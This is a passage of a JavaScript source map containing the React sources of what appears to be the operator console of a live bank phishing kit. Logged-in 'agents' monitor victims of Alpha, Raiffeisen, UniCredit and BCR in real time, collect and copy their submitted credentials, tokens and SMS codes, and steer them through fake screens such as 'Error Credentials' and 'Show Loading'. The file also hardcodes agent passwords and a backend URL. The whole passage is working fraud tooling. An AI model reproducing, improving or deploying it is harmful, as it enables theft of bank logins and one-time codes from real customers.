JSON.parse(sessionStorage.getItem('agent')); },\r\n  set agent(val) { sessionStorage.setItem('agent', JSON.stringify(val)); },\r\n  \r\n  get bank() { return JSON.parse(sessionStorage.getItem('bank')); },\r\n  set bank(val) { sessionStorage.setItem('bank', JSON.stringify(val))},\r\n\r\n  get agents() {\r\n    return [\r\n      { id: 1, username: 'agent1', password: '1passw' },\r\n      { id: 2, username: 'agent2', password: '2passw' },\r\n      { id: 3, username: 'agent3', password: 'passw3' },\r\n      { id: 4, username: 'agent4', password: 'passw4' },\r\n      { id: 7, username: 'admin', password: '1admin1' },\r\n    ]\r\n  }\r\n\r\n}\r\n\r\nexport const isLocked = u => u.lockedBy\r\nexport const isLockedByAgent = u => u.lockedBy === AppStorage.agent.id\r\nexport const isImportant = u => u.status === UserStatus.IMPORTANT\r\nexport const isIgnored = u => u.status === UserStatus.IGNORE\r\n\r\nexport const copyStringToClipboard = (str) => {\r\n  // Create new element\r\n  var el = document.createElement('textarea');\r\n  // Set value (string to be copied)\r\n  el.value = str;\r\n  // Set non-editable to avoid focus and move outside of view\r\n  el.setAttribute('readonly', '');\r\n  el.style = {position: 'absolute', left: '-9999px'};\r\n  document.body.appendChild(el);\r\n  // Select text inside element\r\n  el.select();\r\n  // Copy text to clipboard\r\n  document.execCommand('copy');\r\n  // Remove temporary element\r\n  document.body.removeChild(el);\r\n}\r\n","const configGlobal = {\r\n  development: {\r\n    restURL: \"https://paymentsonline.a2hosted.com/token/rest\",\r\n    // restURL: \"http://localhost:5000/token/rest\",\r\n  },\r\n  production: {\r\n    restURL: \"https://paymentsonline.a2hosted.com/token/rest\",\r\n  },\r\n}\r\n\r\nexport const config = {\r\n  ...configGlobal[process.env.NODE_ENV],\r\n  pullingInterval: 1300\r\n}\r\n\r\n\r\n","import axios from 'axios'\r\nimport { getUTCTimestamp } from './time'\r\nimport { AppStorage } from './utils'\r\nimport { config } from './../config/config'\r\n\r\n\r\n\r\n\r\n\r\nconst REST = config.restURL\r\n\r\n\r\nexport const ajax = (path, method = 'GET', body, options = { updateLastActive: true }) => {\r\n\r\n  const { updateLastActive } = options\r\n\r\n  const lastActive = AppStorage.lastActive || 0\r\n\r\n  // if (updateLastActive) {\r\n  //   AppStorage.lastActive = getUTCTimestamp()\r\n  // }\r\n\r\n\r\n  return axios({\r\n    url: `${REST}${path}`,\r\n    method,\r\n    data: body,\r\n    headers: {\r\n      'last-active': lastActive\r\n    },\r\n  }).then(json => json.data).then(json => {\r\n    AppStorage.lastActive = json.lastActive\r\n    return json.data\r\n  })\r\n\r\n}\r\n","import { ACTIONS_TO_NOTIFY, UserStatus } from './constants'\r\n\r\n\r\nconst beep = new Audio('/pew.wav')\r\nconst fart = new Audio('/fart.wav')\r\n\r\n\r\nconst isNewUser = users => {\r\n  return users.reduce((acc, { status, lockedBy }) => {\r\n    return acc || (status === UserStatus.NEW && !lockedBy)\r\n  }, false)\r\n}\r\n\r\nconst isNewImportantMsg = messages => {\r\n  return !!messages.find(msg => ACTIONS_TO_NOTIFY.includes(msg.action))\r\n}\r\n\r\nexport const notify = ({ users, messages }) => {\r\n  if (isNewUser(users)) {\r\n    beep.play();\r\n  }\r\n\r\n  if (isNewImportantMsg(messages)) {\r\n    fart.play();\r\n  }\r\n}\r\n\r\n","import { ajax } from './client'\r\nimport { ACTIONS_TO_NOTIFY, UserActions, UserStatus } from './constants'\r\nimport { config } from './../config/config'\r\nimport { notify } from './notification'\r\nimport { AppStorage } from './utils'\r\n\r\n\r\nconst MSG_PULLING_INTERVAL = config.pullingInterval\r\n\r\nconst isImportantMsg = msg => {\r\n  return ACTIONS_TO_NOTIFY.includes(msg.action)\r\n}\r\n\r\nexport const Messaging = {\r\n  init: false,\r\n\r\n  start(okCallback, errCallback) {\r\n\r\n    setInterval(async () => {\r\n      const data = await ajax(`/agent/data/${AppStorage.agent.id}`)\r\n\r\n      if (this.init) {\r\n        notify(data)\r\n      }\r\n\r\n      this.init = true\r\n      okCallback(data)\r\n\r\n    }, MSG_PULLING_INTERVAL);\r\n  },\r\n\r\n  async send(userId, action) {\r\n    ajax('/message', 'PUT', { userId, action })\r\n      .catch(e => window.alert('Error for', action.type))\r\n  }\r\n\r\n\r\n\r\n}\r\n\r\n\r\nexport const mergeUsers = (oldUsers, newUsers, unread) => {\r\n\r\n  newUsers.forEach(newUser => {\r\n    const idx = oldUsers.findIndex(o => o.id === newUser.id)\r\n\r\n    if (idx < 0) {\r\n      oldUsers.push(newUser)\r\n      setTimeout(function() {\r\n        if (newUser.status === UserStatus.NEW) {\r\n          newUser.status = UserStatus.OLD\r\n        }\r\n      }, 10 * 1000)\r\n    } else {\r\n      oldUsers[idx] = newUser\r\n    }\r\n  })\r\n\r\n\r\n  return oldUsers.reduce((acc, user) => {\r\n    const newMsg = !!(unread.find(o => o.userId === user.id))\r\n\r\n    return [\r\n      ...acc,\r\n      { ...user, newMsg }\r\n    ]\r\n\r\n  }, [])\r\n\r\n}\r\n\r\n\r\nexport const filterUserMessages = (user, messages) =>\r\n  messages.filter((msg) => msg.userId === user.id)\r\n\r\n\r\nexport const mapUserToMessages = (user, messages) => {\r\n  const isTyping = messages.length && messages[messages.length - 1].action === UserActions.TYPING\r\n\r\n  const extra = messages.reduce((acc, msg) => {\r\n    if (isImportantMsg(msg)) {\r\n      acc.tokens.push(msg.payload)\r\n      acc.lastImportantMsgTmstp = msg.time\r\n    }\r\n\r\n    return acc\r\n  }, { tokens: [], lastImportantMsgTmstp: null })\r\n\r\n\r\n  const ret = {\r\n    ...user,\r\n    isTyping,\r\n    tokens: extra.tokens,\r\n    lastImportantMsgTmstp: extra.lastImportantMsgTmstp,\r\n    messages\r\n  }\r\n\r\n  setTimeout(function() {\r\n    ret.isTyping = false\r\n  }, 2 * 1000)\r\n\r\n  return ret\r\n\r\n}\r\n\r\nexport const mapUsersToMessages = (users, messages) => {\r\n  return users.reduce((acc, user) => {\r\n    return {\r\n      ...acc,\r\n      [user.id]: mapUserToMessages(user, filterUserMessages(user, messages))\r\n    }\r\n  }, {})\r\n\r\n}\r\n\r\nconst messagesAlreadyExists = (messages, msg) => {\r\n  return messages.find(m => m.id === msg.id)\r\n}\r\n\r\nexport const mergeMessages = (oldMessages, newMessages) => {\r\n  return newMessages.reduce((acc, item) => {\r\n    if (!messagesAlreadyExists(acc, item)) {\r\n      acc.push(item)\r\n    }\r\n\r\n    return acc\r\n  }, oldMessages)\r\n\r\n}\r\n\r\n","import React, { useState, useEffect, createContext } from 'react';\n\n\nexport const UserContext = createContext();\n\nexport const UserContextProvider = props => {\n  const [userId, setUserId] = useState(undefined);\n\n  return (\n    <UserContext.Provider value={[userId, setUserId]}>\n      {props.children}\n    </UserContext.Provider>\n  );\n};","import React, { useContext, Fragment } from 'react';\r\nimport { UserContext } from './UserContext'\r\nimport { ajax } from '../utils/client'\r\nimport { isIgnored, isImportant, isLocked, isLockedByAgent, AppStorage } from '../utils/utils'\r\n\r\n\r\nconst toggleLockUser = (userId, locked) => e => {\r\n  e.stopPropagation()\r\n  const agentId = locked ? AppStorage.agent.id : undefined\r\n  ajax('/agent/lockUser', 'POST', { userId, agentId })\r\n}\r\n\r\nexport function User({ user }) {\r\n\r\n  const [userId, setUserId] = useContext(UserContext)\r\n\r\n  const handleClick = () => {\r\n    setUserId(user.id)\r\n    ajax('/agent/readUserMessages', 'POST', { userId: user.id, agentId: AppStorage.agent.id })\r\n  }\r\n\r\n  return (\r\n    <div className={\r\n      `user ${user.id === userId && 'selected'} ${isImportant(user) && 'important'}`\r\n    } onClick={handleClick}>\r\n      <div className=\"user-info-descr\">\r\n        <div className=\"user-id\">{user.id}</div>\r\n        <div className={`user-status ${isImportant(user) && 'important'} ${isIgnored(user) && 'ignored'}`}>{user.status}</div>\r\n        <div>{user.description}</div>\r\n      </div>\r\n      <div className=\"user-info-tokens\">\r\n        <div>Tokens: <b>{user.tokens.length}</b></div>\r\n        {user.newMsg && <div><img src=\"/msg.png\" height=\"44\"/></div>}\r\n      </div>\r\n      <div className=\"user-actions\">\r\n        {/*<div>*/}\r\n        {/*  {user.isTyping && <Typing visible={user.isTyping} />}*/}\r\n        {/*</div>*/}\r\n        <Lock user={user} />\r\n      </div>\r\n    </div>\r\n  );\r\n}\r\n\r\nfunction Lock({ user }) {\r\n  const { id, lockedBy } = user\r\n  const lockedByAgent = lockedBy && AppStorage.agents.find(a => a.id === lockedBy)\r\n\r\n  const lockedByCurrentAgent = isLockedByAgent(user)\r\n\r\n  return (\r\n    <div className={`user-lock ${isLocked(user) && 'locked'} ${lockedByCurrentAgent && 'lockedByMe'}`}>\r\n      {lockedBy ? (\r\n          <Fragment>\r\n            <span>Locked by <b>{lockedByCurrentAgent ? 'me' : lockedByAgent.username}</b></span>\r\n            {lockedByCurrentAgent && <button onClick={toggleLockUser(id, false)}>unlock</button>}\r\n          </Fragment>\r\n        )\r\n        : <button onClick={toggleLockUser(id, true)}>lock</button>\r\n      }\r\n    </div>\r\n  )\r\n}\r\n\r\nclass Typing extends React.Component {\r\n\r\n  state = {\r\n    visible: true\r\n  }\r\n\r\n  componentDidMount() {\r\n    setTimeout(() => {\r\n      this.setState({ visible: false })\r\n    }, 3000)\r\n  }\r\n\r\n  render() {\r\n    const { visible } = this.state\r\n    // const { visible } = this.props\r\n    return <div> {visible ? 'typing...' : null} </div>\r\n  }\r\n\r\n}\r\n\r\n\r\n","import React, { useState, useEffect } from 'react';\nimport { User } from './User'\nimport { UserStatus } from '../utils/constants'\nimport { isIgnored, isImportant, isLockedByAgent, AppStorage } from '../utils/utils'\n\n\n\nexport function Users({ usersData }) {\n\n  const sorted = sortItems(Object.values(usersData))\n\n  const [filter, setFilter] = useState('')\n  const filtered = filterItems(sorted, filter)\n\n  return (\n    <div className=\"users-container \">\n      <Filter filter={filter} setFilter={setFilter} />\n\n      <div className=\"sidebar users \">\n        {filtered.map(user => <User key={user.id} user={user} />)}\n      </div>\n    </div>\n  );\n}\n\nfunction Filter({ filter, setFilter }) {\n\n  return (\n    <div className=\"users-filter\">\n      Filter <input type=\"text\" value={filter} onChange={e => setFilter(e.target.value)} />\n      <button onClick={() => setFilter('')}>clear</button>\n    </div>\n  )\n\n}\n\nconst criteria = predicate => u => predicate(u) ? -1 : 1\nconst lockCriteria = criteria(isLockedByAgent)\nconst importantCriteria = criteria(isImportant)\nconst ignoreCriteria = criteria(isIgnored)\n\nconst sortItems = users => {\n  return users.sort((u1, u2) => {\n\n    const ign1 = ignoreCriteria(u1)\n    const ign2 = ignoreCriteria(u2)\n\n    if (ign1 !== ign2) {\n      return ign2 - ign1;\n    }\n\n    const lock1 = lockCriteria(u1)\n    const lock2 = lockCriteria(u2)\n\n    if (lock1 !== lock2) {\n      return lock1 - lock2\n    }\n\n    const imp1 = importantCriteria(u1)\n    const imp2 = importantCriteria(u2)\n\n    if (imp1 !== imp2) {\n      return imp1 - imp2\n    }\n\n\n    const lastImportantMsgTmstp1 = u1.lastImportantMsgTmstp\n    const lastImportantMsgTmstp2 = u2.lastImportantMsgTmstp\n\n    if (lastImportantMsgTmstp1 && lastImportantMsgTmstp2) {\n      return lastImportantMsgTmstp2 - lastImportantMsgTmstp1\n    } else if (!lastImportantMsgTmstp1 && lastImportantMsgTmstp2) {\n      return 1\n    } else if (lastImportantMsgTmstp1 && !lastImportantMsgTmstp2) {\n      return -1\n    }\n\n\n\n    /*const tokens1 = u1.tokens.length\n    const tokens2 = u2.tokens.length\n\n    if (tokens1 !== tokens2) {\n      return tokens2 - tokens1\n    }*/\n\n\n    return u2.id - u1.id\n  })\n}\n\nconst filterItems = (users, filter) => {\n  if (!filter || filter.trim() === '') {\n    return users\n  }\n\n  return users.filter(u =>\n    u.id.toString().includes(filter)\n    || (u.description && u.description.includes(filter)))\n}\n\n\n","import React, { useState, useContext, Fragment  } from 'react'\r\nimport moment from 'moment'\r\n\r\nimport { UserContext } from './UserContext'\r\nimport { User } from './User'\r\nimport { ajax } from '../utils/client'\r\nimport { AgentInstructions, BankTypes, CREDENTIALS_DELIMETER, UserActions, UserStatus } from '../utils/constants'\r\nimport { AppStorage, copyStringToClipboard } from '../utils/utils'\r\nimport { Messaging } from '../utils/messages'\r\n\r\nexport function Messages({ usersData }) {\r\n\r\n  const [userId] = useContext(UserContext)\r\n  const userData = usersData[userId]\r\n\r\n  return (\r\n    <div className=\"messages sidebar\">\r\n      {userData && (\r\n        <div>\r\n          <div>\r\n            <User user={userData} />\r\n          </div>\r\n          <UserMessages messages={userData.messages} />\r\n          <Actions userId={userId} />\r\n        </div>\r\n      )}\r\n    </div>\r\n  )\r\n}\r\n\r\nfunction UserMessages({ messages }) {\r\n  return (\r\n    <div className=\"user-messages\">\r\n      {messages && messages.map(msg => <Message key={msg.id} message={msg}/>)}\r\n    </div>\r\n  )\r\n}\r\n\r\nconst isUserMessage = action => action.includes('USER')\r\nconst isAgentMessage = action => action.includes('INSTR')\r\n\r\n\r\n\r\nfunction Message({ message: { action, payload, time } }) {\r\n  let Component = null\r\n  switch (action) {\r\n    case UserActions.SEND_CREDENTIALS:\r\n    case UserActions.SEND_TOKEN:\r\n    case UserActions.SEND_SMS:\r\n    case UserActions.SEND_TECH_DATA:\r\n\r\n    case UserActions.RAIF_SEND_AUTH_CODE:\r\n    case UserActions.RAIF_SEND_SMART_TOKEN:\r\n    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:\r\n    case UserActions.UNICREDIT_SEND_IMAGE:\r\n      Component = UserCredentialsMessage\r\n      break;\r\n\r\n    case AgentInstructions.GO_TO_HOME_SCREEN:\r\n    case AgentInstructions.GO_TO_TOKEN_SCREEN:\r\n    case AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN:\r\n    case AgentInstructions.GO_TO_SMS_SCREEN:\r\n    case AgentInstructions.GO_TO_TECH_SCREEN:\r\n    case AgentInstructions.GO_TO_ORIGINAL_SITE:\r\n    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN:\r\n    case AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS:\r\n    case AgentInstructions.ERR_MSG_INVALID_CREDENTIALS:\r\n    case AgentInstructions.SHOW_LOADING_STATE:\r\n    case AgentInstructions.UNICREDIT_GO_TO_IMAGE:\r\n      Component = AgentInstructionMessage\r\n      break;\r\n\r\n    default:\r\n    // do nothing\r\n  }\r\n\r\n  if (!Component) {\r\n    return null\r\n  }\r\n\r\n\r\n  return (\r\n    <div className={`${isUserMessage(action) ? 'user-msg' : 'agent-msg'}`}>\r\n      <div className=\"msg-item\">\r\n        <div className=\"msg-time\">\r\n          {moment(time).format('HH:mm:ss')}\r\n        </div>\r\n        <div className=\"msg-action\">\r\n          <Component action={action} payload={payload} />\r\n        </div>\r\n      </div>\r\n    </div>\r\n  )\r\n\r\n}\r\n\r\nfunction UserCredentialsMessage({ action, payload }) {\r\n  let label;\r\n  switch (action) {\r\n    case UserActions.SEND_CREDENTIALS:\r\n      label = 'Credentials'\r\n      break;\r\n    case UserActions.SEND_TOKEN:\r\n      label = 'Token'\r\n      break;\r\n    case UserActions.RAIF_SEND_AUTH_CODE:\r\n      label = 'Pers fizice Auth code'\r\n      break;\r\n    case UserActions.SEND_SMS:\r\n      label = 'Pers fizice SMS code'\r\n      break;\r\n    case UserActions.RAIF_SEND_SMART_TOKEN:\r\n      label = 'Pers fizice Smart Token'\r\n      break;\r\n    case UserActions.RAIF_SEND_SMART_TOKEN_SMS:\r\n      label = 'Pers fizice Smart Token SMS'\r\n      break;\r\n\r\n    case UserActions.SEND_TECH_DATA:\r\n      label = 'Technical data'\r\n      break;\r\n    case UserActions.UNICREDIT_SEND_IMAGE:\r\n      label = 'Pers fizice image'\r\n      break;\r\n    default:\r\n      // do nothing\r\n  }\r\n\r\n  return (\r\n    <div className=\"msg-payload\">\r\n      <label>{label}:</label>\r\n      {payload && payload.split(CREDENTIALS_DELIMETER).map(item =>\r\n        <Fragment>\r\n          <span className=\"msg-payload-value\">{item}</span>\r\n          <button onClick={() => {copyStringToClipboard(item)} }>copy</button>\r\n        </Fragment>\r\n      )}\r\n\r\n    </div>\r\n  )\r\n\r\n}\r\n\r\nfunction AgentInstructionMessage({ action, payload }) {\r\n  return (\r\n    <div>\r\n      <label>{action}</label>\r\n      <span className=\"msg-payload-value\">{payload}</span>\r\n    </div>\r\n  )\r\n}\r\n\r\n\r\n\r\nfunction Actions({ userId }) {\r\n\r\n  const [description, setDescription] = useState('')\r\n\r\n  return (\r\n    <div className=\"agent-actions\">\r\n      <h3 style={{ margin: '0px' }}>{AppStorage.bank}</h3>\r\n\r\n      <div className=\"agent-actions-update-user\">\r\n        <div className=\"agent-action-description\">\r\n          <input type=\"text\" value={description} onChange={e => setDescription(e.target.value)} />\r\n          <button onClick={() => updateDescription(userId, description, setDescription)}>add description</button>\r\n        </div>\r\n        <div className=\"agent-action-status\">\r\n          <button onClick={() => updateStatus(userId, UserStatus.IGNORE)}>Ignore</button>\r\n          <button onClick={() => updateStatus(userId, UserStatus.IMPORTANT)}>Important</button>\r\n        </div>\r\n      </div>\r\n      <div className=\"agent-action-instructions\">\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_HOME_SCREEN})}>Home</button>\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_SMS_SCREEN})}>Pers fizice SMS Code</button>\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_TECH_SCREEN})}>Technical Works</button>\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.GO_TO_ORIGINAL_SITE})}>Original site</button>\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.ERR_MSG_INVALID_CREDENTIALS})}>Error Credentials</button>\r\n        <button onClick={() => Messaging.send(userId, { type: AgentInstructions.SHOW_LOADING_STATE})}>Show Loading ...</button>\r\n        </div>\r\n          <ActionWithPayload userId={userId} type={AgentInstructions.GO_TO_TOKEN_SCREEN} text=\"Token\"/>\r\n        <div>\r\n\r\n        {AppStorage.bank === BankTypes.RAIFFEISEN && (\r\n        <div>\r\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_AUTH_CODE_SCREEN})}>Pers fizice Auth Code</button>\r\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN})}>Pers fizice Smart Token</button>\r\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.RAIF_GO_TO_SMART_TOKEN_SMS})}>Pers fizice Smart Token SMS</button>\r\n        </div>)}\r\n        {AppStorage.bank === BankTypes.UNI_CREDIT && (\r\n        <div>\r\n          <button onClick={() => Messaging.send(userId, { type: AgentInstructions.UNICREDIT_GO_TO_IMAGE})}>Pers fizice Image</button>\r\n        </div>)}\r\n      </div>\r\n    </div>\r\n\r\n  )\r\n}\r\n\r\nfunction ActionWithPayload({ userId, type, text }) {\r\n\r\n  const [payload, setPayload] = useState('')\r\n\r\n  return (\r\n    <Fragment>\r\n      <input type=\"text\" value={payload} onChange={e => setPayload(e.target.value)} />\r\n      <button onClick={() => {\r\n        Messaging.send(userId, { type, payload })\r\n        setPayload('')\r\n      }}>{text}</button>\r\n    </Fragment>\r\n\r\n  )\r\n}\r\n\r\n\r\nconst updateDescription = (userId, description, setDescription) => {\r\n  ajax('/agent/description', 'POST', { userId, description })\r\n  setDescription('')\r\n}\r\n\r\nconst updateStatus = (userId, status) => {\r\n  ajax('/agent/status', 'POST', { userId, status })\r\n}\r\n\r\nconst agentInstructions = (userId, action) => {\r\n  Messaging.send(userId, action)\r\n}\r\n\r\n\r\n\r\n","import React, { useState, useEffect, createContext } from 'react';\r\nimport { mapUsersToMessages, mergeMessages, mergeUsers, Messaging } from '../utils/messages'\r\nimport { ajax } from '../utils/client'\r\nimport { Users } from './Users'\r\nimport { Messages } from './Messages'\r\nimport { UserContextProvider } from './UserContext'\r\n\r\nexport class Welcome extends React.Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = {\r\n      messages: [],\r\n      users: []\r\n    }\r\n  }\r\n\r\n  // state = []\r\n\r\n  componentDidMount() {\r\n    console.log('****init')\r\n\r\n    // const users = await ajax(`/agent/users`, null, null, { updateLastActive: false })\r\n    // console.log('users', users)\r\n    let init\r\n\r\n    Messaging.start(({ users, messages, unread }) => {\r\n      // if (users.length || messages.length || unread.length) {\r\n        console.log('data', { users, messages, unread })\r\n        this.setState({\r\n          ...this.state,\r\n          users: mergeUsers(this.state.users, users, unread),\r\n          messages: mergeMessages(this.state.messages, messages),\r\n        })\r\n      // }\r\n    })\r\n  }\r\n\r\n  render() {\r\n    const { users, messages } = this.state\r\n\r\n    const usersData = mapUsersToMessages(users, messages)\r\n\r\n    return (\r\n      <div>\r\n        {/*<div className=\"all-messages\">*/}\r\n        {/*  {messages.map(msg => <div key={msg.id}>{JSON.stringify(msg)}</div>)}*/}\r\n        {/*</div>*/}\r\n        <div className=\"welcome\">\r\n          <UserContextProvider>\r\n            <Users usersData={usersData} />\r\n            <Messages usersData={usersData} />\r\n            {/*<UserMessages messages={messages} />*/}\r\n          </UserContextProvider>\r\n        </div>\r\n      </div>\r\n    );\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n","import React, { useState, Fragment, useEffect } from 'react';\r\nimport { AppStorage } from '../utils/utils'\r\nimport { BankTypes } from '../utils/constants'\r\n\r\n\r\nexport function Auth(props) {\r\n  const isLogged = AppStorage.agent && loggedAgent(AppStorage.agent.username, AppStorage.agent.password)\r\n  const [logged, setLogged] = useState(isLogged)\r\n\r\n  return logged ? <Fragment>{props.children}</Fragment> : <Login setLogged={setLogged} />\r\n}\r\n\r\nfunction Login({ setLogged }) {\r\n\r\n  const [username, setUsername] = useState('')\r\n  const [password, setPassword] = useState('')\r\n  const [bank, setBank] = useState(BankTypes.ALPHA)\r\n  const [error, setError] = useState(false)\r\n  \r\n  return (\r\n    <div className=\"login\">\r\n      <div>\r\n        <select id=\"banks\" name=\"banks\" onChange={(e) => setBank(e.target.value)} defaultValue={BankTypes.ALPHA}>\r\n          <option value={BankTypes.ALFA}>{BankTypes.ALPHA}</option>\r\n          <option value={BankTypes.RAIFFEISEN}>{BankTypes.RAIFFEISEN}</option>\r\n          <option value={BankTypes.UNI_CREDIT}>{BankTypes.UNI_CREDIT}</option>\r\n          <option value={BankTypes.BCR}>{BankTypes.BCR}</option>\r\n\r\n        </select>\r\n      </div>\r\n      <div>\r\n        <input type=\"text\" value={username} onChange={e => setUsername(e.target.value)} placeholder=\"username\" />\r\n      </div>\r\n      <div>\r\n        <input type=\"password\" value={password} onChange={e => setPassword(e.target.value)} placeholder=\"password\" />\r\n      </div>\r\n      <div>\r\n        {/* <button onClick={e => authenticate(username, password, setError, setLogged)}>login</button> */}\r\n        <button onClick={e => authenticate(username, password, setError, setLogged, bank)}>login</button>\r\n      </div>\r\n      {error && <div className=\"error\">Invalid Credentials</div>}\r\n    </div>\r\n  )\r\n\r\n}\r\n\r\nconst authenticate = (username, password, setError, setLogged, bank) => {\r\n  const agent = loggedAgent(username, password)\r\n  AppStorage.bank = bank\r\n  if (agent) {\r\n    AppStorage.agent = agent\r\n    setError(false)\r\n    setLogged(true)\r\n  } else {\r\n    setError(true)\r\n  }\r\n}\r\n\r\nconst loggedAgent = (username, password) => AppStorage.agents.find(agent => agent.username === username && agent.password === password)\r\n\r\n\r\n","import React from 'react';\r\nimport './App.css';\r\nimport { Welcome } from './components/Welcome'\r\nimport { Auth } from './components/Auth'\r\n\r\nconsole.log('ENV:', process.env.NODE_ENV)\r\n\r\nfunction App() {\r\n  return (\r\n    <div className=\"App\">\r\n      <Auth>\r\n        <Welcome/>\r\n      </Auth>\r\n    </div>\r\n  );\r\n}\r\n\r\nexport default App;\r\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' },\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready\n      .then(registration => {\n        registration.unregister();\n      })\n      .catch(error => {\n        console.error(error.message);\n      });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\n// window.store = {}\n\n//TODO\n// window.store.agent = { id: 1, name: 'Vanea' }\n\nReactDOM.render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}